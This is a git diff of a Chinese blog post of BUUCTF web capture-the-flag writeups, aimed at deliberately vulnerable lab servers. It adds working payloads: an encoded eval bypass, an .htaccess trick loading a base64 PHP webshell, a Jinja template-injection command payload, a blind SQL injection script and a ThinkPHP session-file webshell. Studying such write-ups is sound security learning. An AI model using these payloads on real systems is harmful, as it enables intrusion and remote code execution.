@@ -1,12 +1,12 @@
 ---
 title: "BUUCTF Web Writeup 6"
-date: 2022-09-26T19:36:33+08:00
-lastmod: 2022-09-26T19:36:33+08:00
+date: 2022-11-02T19:36:33+08:00
+lastmod: 2022-11-02T19:36:33+08:00
 draft: true
 author: "X1r0z"
 
-tags: []
-categories: []
+tags: ['ctf']
+categories: ['web']
 
 hiddenFromHomePage: false
 hiddenFromSearch: false
@@ -17,6 +17,8 @@ math:
   enable: false
 lightgallery: false
 ---
+
+BUUCTF 刷题记录…
 
 <!--more-->
 
@@ -678,7 +680,7 @@ information_schema 被过滤了, 因为含有 or
 
 当然这个 payload 目前还有点问题, 比如不能区分大小写 (binary 含有 in 被过滤了)
 
-(绕过 binary 过滤来区分大小写的参考文章 [https://nosec.org/home/detail/3830.html](https://nosec.org/home/detail/3830.html)
+(绕过 binary 过滤来区分大小写的参考文章 [https://nosec.org/home/detail/3830.html](https://nosec.org/home/detail/3830.html))
 
 不过对于本题读取 flag 来说是不影响的
 
@@ -1146,7 +1148,7 @@ $phar->stopBuffering();
 
 robots.txt 里可以看到 hint.txt, 内容如下
 
-```
+```php
 $black_list = "/limit|by|substr|mid|,|admin|benchmark|like|or|char|union|substring|select|greatest|%00|\'|=| |in|<|>|-|\.|\(\)|#|and|if|database|users|where|table|concat|insert|join|having|sleep/i";
 
 
@@ -1262,8 +1264,6 @@ def upload():
             cookies={'PHPSESSID': flag},
         )
 
-
-
 def write():
     while True:
         response = requests.get(
@@ -1368,7 +1368,7 @@ $content = preg_replace('/HarekazeCTF\{.+\}/i', 'HarekazeCTF{&lt;censored&gt;}',
 echo json_encode(['content' => $content]);
 ```
 
-json decode 时会自动把 `\u` 开头的 Unicode 编码转换为正常的字符串 (看 wp 才发现的, 一搜这个技巧出来的全都是这题的 wp...)
+json decode 时会自动把 `\u` 开头的 Unicode 或者 `\x` 开头的 hex 转换为正常的字符串
 
 在线工具 [https://tool.chinaz.com/tools/native_ascii.aspx](https://tool.chinaz.com/tools/native_ascii.aspx)
 
@@ -1380,3 +1380,419 @@ json decode 时会自动把 `\u` 开头的 Unicode 编码转换为正常的字�
 
 ![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210212015375.png)
 
+## [SUCTF 2019]EasyWeb
+
+```php
+<?php
+function get_the_flag(){
+    // webadmin will remove your upload file every 20 min!!!! 
+    $userdir = "upload/tmp_".md5($_SERVER['REMOTE_ADDR']);
+    if(!file_exists($userdir)){
+    mkdir($userdir);
+    }
+    if(!empty($_FILES["file"])){
+        $tmp_name = $_FILES["file"]["tmp_name"];
+        $name = $_FILES["file"]["name"];
+        $extension = substr($name, strrpos($name,".")+1);
+    if(preg_match("/ph/i",$extension)) die("^_^"); 
+        if(mb_strpos(file_get_contents($tmp_name), '<?')!==False) die("^_^");
+    if(!exif_imagetype($tmp_name)) die("^_^"); 
+        $path= $userdir."/".$name;
+        @move_uploaded_file($tmp_name, $path);
+        print_r($path);
+    }
+}
+
+$hhh = @$_GET['_'];
+
+if (!$hhh){
+    highlight_file(__FILE__);
+}
+
+if(strlen($hhh)>18){
+    die('One inch long, one inch strong!');
+}
+
+if ( preg_match('/[\x00- 0-9A-Za-z\'"\`~_&.,|=[\x7F]+/i', $hhh) )
+    die('Try something else!');
+
+$character_type = count_chars($hhh, 3);
+if(strlen($character_type)>12) die("Almost there!");
+
+eval($hhh);
+?>
+```
+
+限制挺猛的... 看的 wp
+
+[https://github.com/team-su/SUCTF-2019/blob/master/Web/easyweb/wp/SUCTF 2019 Easyweb.md](https://github.com/team-su/SUCTF-2019/blob/master/Web/easyweb/wp/SUCTF 2019 Easyweb.md)
+
+思路是利用可变变量 `${$a}` +  `$_GET` 跳出长度限制, 然后上传 .htaccess 配合 php.ini 中的设置 + php://filter 过滤器绕过内容检测
+
+这里有个知识点: 字符与 `0xff` 异或相当于自身取反
+
+构造 payload (刚好 18 字符)
+
+```
+${%A0%B8%BA%AB^%ff%ff%ff%ff}{%ff}();&%ff=phpinfo
+```
+
+其中 `%A0%B8%BA%AB` 就是 `_GET` 取反后的结果, 然后通过可变变量变成 `$_GET`
+
+注意 get 传参的参数也得是不可见字符
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211021659545.png)
+
+
+
+flag 在 phpinfo 里面直接就能看到了... 预期解的思路是上传文件 然后利用 .htaccess 中的 `php_value` 来设置 php.ini 的部分内容 (类似 .user.ini), 然后利用 `auto_append_file` 插入 php 代码
+
+但因为上传的文件中过滤了 `<?`, 所以我们需要通过 php://filter 中的过滤器来绕过 (`auto_append_file` 其实就是 include, 也支持伪协议), 方法很多 (utf-7 utf-16 base64 等等), 这里以 base64 为例
+
+.htaccess
+
+```php
+#define width 1337
+#define height 1337
+AddType application/x-httpd-php .xxx
+
+php_value auto_append_file "php://filter/read=convert.base64-decode/resource=123.xxx"
+```
+
+123.xxx
+
+```
+GIF89AaaPD9waHAgZXZhbCgkX1JFUVVFU1RbMV0pO3BocGluZm8oKTs/Pg
+```
+
+开头的 `GIF89A` 用来绕过 `exif_imagetype()`, 其中 `PD9waHAgZXZhbCgkX1JFUVVFU1RbMV0pO3BocGluZm8oKTs/Pg` 后面本来要补两个 `=`, 但 `GIF89A` 一共 6 个字符, 所以干脆就把 `=` 删掉并在 `GIF89A` 后面补上了两个 a
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211021715148.png)
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211021715617.png)
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211021715539.png)
+
+连接查看 flag
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211021718717.png)
+
+环境还是跟原题不一样... 没办法了
+
+## [CISCN2019 华东南赛区]Double Secret
+
+根据提示猜了个 /secret
+
+```
+http://15fd0e7e-28c6-4777-a466-7eee2ff489bb.node4.buuoj.cn:81/secret?secret=asdasd
+```
+
+触发报错, 可以看到部分源码
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211021753856.png)
+
+rc4 加密, 密钥为 `HereIsTreasure`
+
+网上找了一堆 rc4 加解密脚本都不行, 最后只能用 wp 里的脚本...
+
+```python
+import base64
+from urllib.parse import quote
+
+def rc4_main(key = "init_key", message = "init_message"):
+    s_box = rc4_init_sbox(key)
+    crypt = str(rc4_excrypt(message, s_box))
+    return  crypt
+
+def rc4_init_sbox(key):
+    s_box = list(range(256))
+    j = 0
+    for i in range(256):
+        j = (j + s_box[i] + ord(key[i % len(key)])) % 256
+        s_box[i], s_box[j] = s_box[j], s_box[i]
+    return s_box
+
+def rc4_excrypt(plain, box):
+    res = []
+    i = j = 0
+    for s in plain:
+        i = (i + 1) % 256
+        j = (j + box[i]) % 256
+        box[i], box[j] = box[j], box[i]
+        t = (box[i] + box[j]) % 256
+        k = box[t]
+        res.append(chr(ord(s) ^ k))
+    cipher = "".join(res)
+    print("cipher: %s" %quote(cipher))
+    return (str(base64.b64encode(cipher.encode('utf-8')), 'utf-8'))
+
+rc4_main("HereIsTreasure", r"{{url_for['__global''s__']['__builtins__']['__im''port__']('os')['p''open']('cat /flag.txt')['rea''d']()}}")
+```
+
+绕过很简单就不写了
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211021755880.png)
+
+## [网鼎杯2018]Unfinish
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211022014767.png)
+
+register.php
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211022014811.png)
+
+登录后会显示用户名
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211022015015.png)
+
+猜测存在二次注入
+
+注册时在 email 处试了好久都不行, 后来才发现是 username
+
+```sql
+email=aaa@qq.com&username=1'^(case when length(database())>0 then sleep(5) else 0 end)^'1&password=3
+```
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211022016310.png)
+
+因为过滤了逗号, 不太好直接闭合, 所以改成用异或连接, 例如
+
+```sql
+'1'^true^'1' # true
+'1'^false^'1' # false
+```
+
+整个表达式的真假性与中间的表达式一致, 第一条在登录后会显示 1, 第二条显示 0
+
+wp 中用的是 `+`, 原理都差不多
+
+题目过滤了 `,`  考虑用 `substring(a from b for c)`
+
+同时 `information_shema` 也被过滤了, 并且 mysql 版本为 `5.5.64` 无 sys 库, 也没有启用 innoDB
+
+于是猜测表名为 flag, 然后绕过列名直接进行无列名注入, 列数试一试就出来了
+
+```python
+import requests
+import random
+import re
+import time
+
+url = 'http://f3fab6bd-8df8-48a5-9e05-36ba8a4a3234.node4.buuoj.cn:81'
+
+def register(sql):
+    payload = "1'^({})^'1".format(sql)
+    email = str(random.random()) + '@qq.com',
+    data = {
+    'email': email,
+    'username': payload,
+    'password': '1'
+    }
+    res = requests.post(url + '/register.php', data=data)
+    if res.status_code == '200':
+        print('error')
+        exit()
+    return email
+
+def login(email):
+    data = {
+    'email': email,
+    'password': '1'
+    }
+    res = requests.post(url + '/login.php', data=data)
+    code = int(re.findall(r'<span class="user-name">\n[ ]{1,}(.*?)[ ]{1,}<\/span>', res.text)[0])
+    return code
+
+
+flag = ''
+
+i = 1
+
+while True:
+
+    min = 32
+    max = 127
+
+    while min < max:
+        time.sleep(0.3)
+        mid = (min + max) // 2
+        print('testing',chr(mid))
+        sql = 'ascii(substring((select group_concat(`1`) from (select 1 union select * from flag)x) from {} for 1))>{}'.format(i,mid)
+        if login(register(sql)):
+            min = mid + 1
+        else:
+            max = mid
+    flag += chr(min)
+    print(flag)
+    i += 1
+```
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211022023426.png)
+
+## [GYCTF2020]EasyThinking
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211022042305.png)
+
+www.zip
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211022042603.png)
+
+thinkphp 6.0 筛子
+
+参考文章 [https://www.anquanke.com/post/id/257485](https://www.anquanke.com/post/id/257485)
+
+利用条件是 session 可控, 恰好 Member.php 中存在相关逻辑
+
+```php
+<?php
+namespace app\home\controller;
+
+use think\exception\ValidateException;
+use think\facade\Db;
+use think\facade\View;
+use app\common\model\User;
+use think\facade\Request;
+use app\common\controller\Auth;
+
+class Member extends Base
+{
+
+    public function index()
+    {
+        if (session("?UID"))
+        {
+            $data = ["uid" => session("UID")];
+            $record = session("Record");
+            $recordArr = explode(",", $record);
+            $username = Db::name("user")->where($data)->value("username");
+            return View::fetch('member/index',["username" => $username,"record_list" => $recordArr]);
+        }
+        return view('member/index',["username" => "Are you Login?","record_list" => ""]);
+    }
+
+    public function login()
+    {
+        if (Request::isPost()){
+            $username = input("username");
+            $password = md5(input("password"));
+            $data["username"] = $username;
+            $data["password"] = $password;
+            $userId = Db::name("user")->where($data)->value("uid");
+            $userStatus = Db::name("user")->where($data)->value("status");
+            if ($userStatus == 1){
+                return "<script>alert(\"该用户已被禁用，无法登陆\");history.go(-1)</script>";
+            }
+            if ($userId){
+                session("UID",$userId);
+                return redirect("/home/member/index");
+            }
+            return "<script>alert(\"用户名或密码错误\");history.go(-1)</script>";
+
+        }else{
+            return view('login');
+        }
+    }
+
+    public function register()
+    {
+        if (Request::isPost()){
+            $data = input("post.");
+            if (!(new Auth)->validRegister($data)){
+                return "<script>alert(\"当前用户名已注册\");history.go(-1)</script>";
+            }
+            $data["password"] = md5($data["password"]);
+            $data["status"] = 0;
+            $res = User::create($data);
+            if ($res){
+                return redirect('/home/member/login');
+            }
+            return "<script>alert(\"注册失败\");history.go(-1)</script>";
+        }else{
+            return View("register");
+        }
+    }
+
+    public function logout()
+    {
+        session("UID",NULL);
+
+        return "<script>location.href='/home/member/login'</script>";
+    }
+
+    public function updateUser()
+    {
+        $data = input("post.");
+        $update = Db::name("user")->where("uid",session("UID"))->update($data);
+        if($update){
+            return json(["code" => 1, "msg" => "修改成功"]);
+        }
+        return json(["code" => 0, "msg" => "修改失败"]);
+    }
+
+    public function rePassword()
+    {
+        $oldPassword = input("oldPassword");
+        $password = input("password");
+        $where["uid"] = session("UID");
+        $where["password"] = md5($oldPassword);
+        $res = Db::name("user")->where($where)->find();
+        if ($res){
+            $rePassword = User::update(["password" => md5($password)],["uid"=> session("UID")]);
+            if ($rePassword){
+                return json(["code" => 1, "msg" => "修改成功"]);
+            }
+            return json(["code" => 0, "msg" => "修改失败"]);
+        }
+        return json(["code" => 0, "msg" => "原密码错误"]);
+    }
+
+    public function search()
+    {
+        if (Request::isPost()){
+            if (!session('?UID'))
+            {
+                return redirect('/home/member/login');            
+            }
+            $data = input("post.");
+            $record = session("Record");
+            if (!session("Record"))
+            {
+                session("Record",$data["key"]);
+            }
+            else
+            {
+                $recordArr = explode(",",$record);
+                $recordLen = sizeof($recordArr);
+                if ($recordLen >= 3){
+                    array_shift($recordArr);
+                    session("Record",implode(",",$recordArr) . "," . $data["key"]);
+                    return View::fetch("result",["res" => "There's nothing here"]);
+                }
+
+            }
+            session("Record",$record . "," . $data["key"]);
+            return View::fetch("result",["res" => "There's nothing here"]);
+        }else{
+            return View("search");
+        }
+    }
+}
+```
+
+`search()` 方法将每一次的搜索结果追加到 session Record 中, 而搜索结果可控
+
+先注册用户 123/123, 登录的时候注意更改 PHPSESSID (构造 32 位长度)
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211022044476.png)
+
+然后搜索, key 处填入 php 代码
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211022045991.png)
+
+最后访问 `/runtime/session/sess_aaaaaaaaaaaaaaaaaaaaaaaaaaaa.php`
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211022048248.png)
+
+蚁剑连接, 用 PHP7 Backtrace UAF bypass disable_function 执行命令
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211022049764.png)
